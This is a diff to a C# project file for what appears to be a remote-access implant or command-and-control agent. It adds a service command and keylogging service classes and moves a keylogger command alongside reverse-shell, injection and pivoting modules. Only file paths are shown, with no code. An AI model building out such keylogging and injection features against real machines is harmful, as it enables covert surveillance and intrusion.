@@ -66,6 +66,7 @@
     <Compile Include="Commands\FileSystem\CatCommand.cs" />
     <Compile Include="Commands\Services\ProxyCommand.cs" />
     <Compile Include="Commands\Services\PivotCommand.cs" />
+    <Compile Include="Commands\Services\ServiceCommand.cs" />
     <Compile Include="Commands\Services\ServicesCommand.cs" />
     <None Include="Commands\UnLinkCommand.cs.old" />
     <Compile Include="Commands\ReverseShellCommand.cs" />
@@ -78,7 +79,7 @@
     <Compile Include="Commands\Injection\SelfInjectCommand.cs" />
     <Compile Include="Commands\Injection\SpawnInjectCommand.cs" />
     <Compile Include="Commands\Execution\StartCommand.cs" />
-    <Compile Include="Commands\KeyLoggerCommand.cs" />
+    <Compile Include="Commands\Services\KeyLoggerCommand.cs" />
     <Compile Include="Commands\ListProcessCommand.cs" />
     <Compile Include="Commands\Server\WGetCommand.cs" />
     <Compile Include="Commands\MetaCommand.cs" />
@@ -129,6 +130,7 @@
     <Compile Include="Service\FileService.cs" />
     <Compile Include="Service\IFileService.cs" />
     <Compile Include="Service\IMessageService.cs" />
+    <Compile Include="Service\RunningService\IKeyLogService.cs" />
     <Compile Include="Service\RunningService\IPivotService.cs" />
     <Compile Include="Service\IProxyService.cs" />
     <Compile Include="Service\RunningService\IRunningService.cs" />
@@ -136,6 +138,7 @@
     <Compile Include="Service\Pivoting\PivotServer.cs" />
     <Compile Include="Service\Pivoting\PivotPipeServer.cs" />
     <Compile Include="Service\Pivoting\PivotTCPServer.cs" />
+    <Compile Include="Service\RunningService\KeyLogService.cs" />
     <Compile Include="Service\RunningService\PivotService.cs" />
     <Compile Include="Service\RunningService\ProxyService.cs" />
     <Compile Include="Service\MessageService.cs" />
